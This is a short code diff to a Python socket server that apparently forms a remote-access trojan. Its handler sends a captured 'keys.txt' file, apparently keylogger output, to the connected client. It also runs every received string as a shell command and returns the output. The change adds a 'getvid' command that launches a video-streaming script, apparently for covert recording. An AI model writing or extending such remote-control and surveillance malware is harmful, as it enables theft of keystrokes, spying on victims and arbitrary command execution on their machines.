@@ -36,12 +36,16 @@ def handle(clientsocket):
             with open('keys.txt', 'r') as f:
                 output = f.read()
                 clientsocket.send(str(output).encode("UTF-8"))
+        if recv == 'getvid':
+            print("Starting Video Stream")
+            os.system('python vidserv.py')
         p = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE)
         output, err = p.communicate()
         clientsocket.send(str(output).encode("UTF-8"))
         print(colors.BLUE)
         os.system(recv)
         print(colors.END)
+
 
 ##Socks
 servs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
